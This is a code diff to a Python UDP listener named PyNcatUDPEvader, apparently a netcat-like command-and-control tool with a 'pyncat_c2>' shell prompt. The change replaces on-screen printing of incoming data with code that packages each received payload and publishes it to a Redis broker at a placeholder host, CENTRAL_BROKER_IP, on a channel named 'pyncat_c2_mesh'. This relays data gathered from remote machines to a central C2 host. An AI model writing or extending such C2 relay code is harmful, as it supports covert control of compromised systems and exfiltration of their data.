@@ -12,6 +12,8 @@ import subprocess
 import threading
 import base64
 import tqdm
+import redis
+import json
 
 # Load structural AES-GCM engine components for UDP security profiles if available
 try:
@@ -319,12 +321,28 @@ class PyNcatUDPEvader:
                     if output_file_handle:
                         break
                     continue
-                if output_file_handle:
+                                # Inside the while True loop of listen(), replacing the standard screen output logic:
+                if output_file_handle: 
                     output_file_handle.write(data)
                 else:
-                    clean_msg = data.decode('utf-8', errors='replace').strip()
+                    clean_msg = data.decode('utf-8', errors='replace')
                     if clean_msg:
-                        print(f"\n[{addr[0]}:{addr[1]}]:\n{clean_msg}")
+                        # Serialize packet tracking metadata
+                        packet_payload = {
+                            "source": f"{addr[0]}:{addr[1]}",
+                            "timestamp": time.strftime('%H:%M:%S'),
+                            "payload": clean_msg
+                        }
+                        
+                        # Ship the fragment to the central broker instantaneously
+                        try:
+                            import redis
+                            import json
+                            r = redis.Redis(host='CENTRAL_BROKER_IP', port=6379, db=0)
+                            r.publish('pyncat_c2_mesh', json.dumps(packet_payload))
+                        except Exception as cache_err:
+                            logging.error(f"[-] Shared cache routing failure: {cache_err}")
+
                     sys.stdout.write("pyncat_c2> ")
                     sys.stdout.flush()
                     response_input = sys.stdin.readline()
